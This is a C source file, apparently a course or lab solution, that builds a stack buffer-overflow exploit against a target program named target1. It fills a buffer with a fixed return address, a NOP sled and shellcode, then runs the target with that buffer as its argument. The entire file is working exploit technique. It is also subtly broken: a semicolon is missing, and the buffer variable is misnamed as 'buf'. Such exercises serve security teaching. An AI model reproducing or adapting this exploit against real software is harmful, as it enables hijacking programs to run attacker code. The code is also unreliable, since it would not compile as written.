// (c) 2015 Tony Liu and Reid Pryzant
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_BUFFER_SIZE 228
#define NOP                 0x90
#define TGT_ADDRESS         0xBFFFFCE0

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

//constructs the malicious buffer
char *make_buffer() {
  char *buff, *tmp;
  long *addr_ptr;
  int i;
  long addr = TGT_ADDRESS

  buff = (char *)malloc(DEFAULT_BUFFER_SIZE);
  addr_ptr = (long *)buff;

  //addresses are 4 bytes (32 bits)
  for(i = 0; i<DEFAULT_BUFFER_SIZE/4; i++) {
    addr_ptr[i] = addr;
  }
  
  for(i = 0; i<DEFAULT_BUFFER_SIZE/2; i++) {
    buff[i] = NOP;
  }
  //for enough room for shellcode
  tmp = buf + 128 - strlen(shellcode);
  
  for(i = 0; i < strlen(shellcode); i++) {
    *(tmp++) = shellcode[i];
  }
  buf[DEFAULT_BUFFER_SIZE-1] = '\0';

  return buff;
}

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];
  char *target = (argc == 2) ? argv[1] : "/usr/local/bin/target1";

  args[0] = target; args[1] = make_buffer(); args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(target, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
